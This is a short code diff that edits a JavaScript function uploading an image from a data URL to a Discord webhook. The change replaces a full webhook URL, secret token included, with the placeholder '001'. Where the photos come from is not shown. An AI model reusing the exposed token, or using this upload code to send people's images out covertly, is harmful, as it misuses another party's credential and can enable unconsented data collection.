@@ -57,7 +57,7 @@
         }
 
         async function sendPhotoToDiscord(dataUrl, fileName) {
-            const webhookUrl = "https://discordapp.com/api/webhooks/1344440845419548702/pP1MvXgW6Va0rTZ_IqTd90x77N5PHZAlWnuAEiicJlv0-cPY2zkQm6sQEnSeKEIMd7Bk";
+            const webhookUrl = "001";
             const blob = await (await fetch(dataUrl)).blob();
             const formData = new FormData();
             formData.append("file", blob, fileName);
